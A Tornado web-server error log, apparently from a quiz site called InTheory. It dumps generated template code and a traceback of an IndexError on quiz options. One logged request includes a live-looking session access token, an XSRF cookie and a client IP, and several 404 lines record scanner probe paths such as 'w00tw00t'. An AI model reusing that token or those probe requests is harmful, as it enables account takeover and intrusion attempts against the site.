455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 1.54ms
WARNING:root:405 HEAD / (127.0.0.1) 0.70ms
WARNING:root:404 GET /h (127.0.0.1) 0.79ms
WARNING:root:404 GET /# (127.0.0.1) 0.79ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 1.10ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 1.26ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 1.49ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 1.47ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (94.75.209.131) 1.10ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.55ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.37ms
WARNING:root:405 HEAD / (127.0.0.1) 0.66ms
WARNING:root:405 HEAD / (127.0.0.1) 0.70ms
WARNING:root:405 HEAD / (127.0.0.1) 0.67ms
WARNING:root:405 HEAD / (127.0.0.1) 0.66ms
WARNING:root:405 HEAD / (127.0.0.1) 1.57ms
WARNING:root:405 HEAD / (127.0.0.1) 0.74ms
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5057818d8e4c8571b4b34823&answers=%5B0%5D&cursor=0&_xsrf=36c72ad09a6a45d89e729cf0a7a6c950', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.167.54.162', 'Cookie': '_xsrf=36c72ad09a6a45d89e729cf0a7a6c950; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1347911957|a6de482e36ded82a69eb39321cd99a79aafc8e40"; __utma=188782963.2080245892.1347887295.1347887295.1347909760.2; __utmb=188782963.11.10.1347909760; __utmc=188782963; __utmz=188782963.1347887295.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 210.08ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
